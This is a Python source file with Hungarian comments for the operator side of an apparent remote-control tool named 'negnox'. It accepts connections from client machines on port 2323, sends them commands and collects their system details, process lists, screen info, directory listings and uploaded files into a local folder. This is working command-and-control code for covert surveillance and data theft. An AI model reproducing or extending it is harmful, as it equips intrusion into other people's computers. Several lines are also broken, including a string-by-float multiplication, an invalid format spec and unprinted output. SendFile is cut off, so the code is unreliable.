import socket
import threading
#from pathlib import Path
import negnox
import time
import os

class TCPHelper:
    @staticmethod
    def listen():
        serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serverSocket.bind(("0.0.0.0", 2323))
        serverSocket.listen()
        print("")
        print("[listener elindult...]")

        while True:
            client, addr = serverSocket.accept()
            negnox.Program.kliensek.append(client)
            print("")
            print(f"{addr[0]}:{addr[1]} joined the game")
            if negnox.Program.isPromptLive == True:
                print("negnox>", end='')
            threading.Thread(target=TCPHelper.monitorClient, args=(client,), daemon=True).start()

    @staticmethod
    def monitorClient(client):
        ip = client.getpeername()[0]
        try:
            
            while True:
                try:

                    data = client.recv(10000)
                    if not data:
                        break
                except ConnectionResetError:
                    break
                text = data.decode("utf-8", errors="ignore")
                adat = text.split("|")

                if adat[0] == "sysinfo":
                    outputinfo = f"\n{adat[1]}\n           RAM : \n    {adat[3]} MB / {adat[4]} MB\n"
                    hanyszazalekmentel = (30/float(adat[4]*float(adat[3])))
                    outputinfo+="|"
                    try:
                        for i in range(30):
                            if i<= hanyszazalekmentel:
                                outputinfo+= "#"
                            else : outputinfo+= "-"
                        outputinfo+="|\n"
                        #cpu
                        outputinfo += f"     CPU Usage: {adat[5]:0.00}%\n"
                        cpuszazalekbar = (30 / float(100)) * float(adat[5])
                        for i in range(30):
                            if i<= cpuszazalekbar:
                                outputinfo+= "#"
                            else : outputinfo+= "-"
                        outputinfo+=f"|\n\nhostname:{adat[6]}\nwhoami : {adat[2]}\nVideo Drivers(bugos):\n{adat[7]}\n"
                    except Exception as e:
                        print(f"error : {e}")
                    if negnox.Program.isPromptLive == True :
                        negnox.writePrompt()



                elif adat[0] == "cmd":
                    print("")
                    print(f"{adat[1]} {adat[2]}")
                    
                elif adat[0] == "rp":
                    print("")
                    print(f"---Futó alkalmazások {negnox.Program.targetIp} gépén: ---")
                elif adat[0] == "screens":
                    time.sleep(1)
                    print("")
                    print(f"{negnox.Program.targetIp}-nek a képernyői :")
                    print("-------------------------------")
                    try:
                        for i in range(int(adat[1])):
                            print(f"{adat[2 + i * 4]} - fő monitor : {adat[3 + i * 4]} - x:{adat[4 + i * 4]} - y:{adat[5 + i * 4]}")
                            print("-------------------------------")
                            print("")
                        if negnox.Program.isPromptLive == True :
                            negnox.writePrompt()
                    except Exception as e:
                        print("elkudtad nandi")
                elif adat[0] == "file":
                    try:

                        if not os.path.isdir("dataFromClients") :
                            os.mkdir("dataFromClients")
                        TCPHelper.GetFile(client)

                        #if negnox.Program.screenShotJon == True :
                            #start image
                        if negnox.Program.isPromptLive == True :
                            negnox.writePrompt()
                    except Exception as e :
                        print(e)
                elif adat[0] == "ls":
                    cuccokAKonyvtarban = adat[1].split('\n')
                    print("Show directory:")
                    print("-" * 70)
                    cuccokAKonyvtarban.pop()
                    for i in range(len(cuccokAKonyvtarban)):
                        mappa = False
                        if cuccokAKonyvtarban[i].split('?')[1] == "mappa":
                            mappa = True
                        fajlnev = cuccokAKonyvtarban[i].split('?')[0]
                        if mappa:
                            print("[MAPPA] > ", end="")
                        else:
                            print("[FÁJL]  > ", end="")
                        print(fajlnev)
                    print("-" *70)
                elif adat[0] == "pwd":
                    print(adat[1])
                elif adat[0] == "cd":
                    print(adat[1])
                elif adat[0] == "download":
                    print("nem sikerült a letöltés:(")
                elif adat[0] == "audio":
                    print(adat[1])
                


        finally:
            negnox.Program.kliensek.remove(client)
            client.close()
            print(f"[{ip} disconnected]")
            print("")
    
    
    #getfiles---------------------------------------------------------
    
    def GetFile(sock):
        # mappa
        base_dir = "dataFromClients"
        #os.makedirs(base_dir, exist_ok=True)

        # 1️⃣ fájlnév
        file_name = TCPHelper.read_line(sock)
        received_file_name = os.path.basename(file_name)

        # 2️⃣ fájlméret
        file_size = int(TCPHelper.read_line(sock))

        path = os.path.join(base_dir, received_file_name)

        # 3️⃣ fájl tartalom
        total_read = 0

        with open(path, "wb") as f:
            while total_read < file_size:
                to_read = min(8192, file_size - total_read)
                chunk = sock.recv(to_read)

                if not chunk:
                    raise IOError("Kapcsolat megszakadt")

                f.write(chunk)
                total_read += len(chunk)

        print(f"[megjött a file| mentve : ./{base_dir}/{received_file_name}]")
        return received_file_name
    
    def read_line(sock):
            data = b""
            while not data.endswith(b"\n"):
                chunk = sock.recv(1)
                if not chunk:
                    raise ConnectionError("Kapcsolat megszakadt")
                data += chunk
            return data.decode("utf-8", errors="ignore").strip()
    #send--------------------------------------------------------------------
    @staticmethod
    def Send(message:str):
        time.sleep(0.1)
        data = message.encode("utf-8")
        if negnox.Program.vanTarget :
            client = None

            for c in negnox.Program.kliensek:
                try:
                    ip = c.getpeername()[0]
                    if ip == negnox.Program.targetIp:
                        client = c
                        break
                except :
                    pass
            if client :
                try:
                    client.sendall(data)
                    print(f"[{message} elküldve erre: {negnox.Program.targetIp}]")
                except :
                    print(f"[hiba a küldés során {negnox.Program.targetIp}-nek]")
            else :
                
                print(f"[Nincsen {negnox.Program.targetIp} nevű kliens csatlakozva]")
        else :
            for client in negnox.Program.kliensek[:]:
                try:
                    client.sendall(data)
                    ip = client.getpeername()[0]
                    print(f"[{message} elküldve {ip}-nek]")
                except:
                    ip = client.getpeername()[0]
                    print(f"{ip} removed")
                    negnox.Program.kliensek.remove(client)


        #print(message)
    #sendfiles
    @staticmethod
    def SendFile(filePath, targetFilePath):
        if not os.path.isfile(filePath):
            print("[A megadott fájl nem létezik!]")
        
        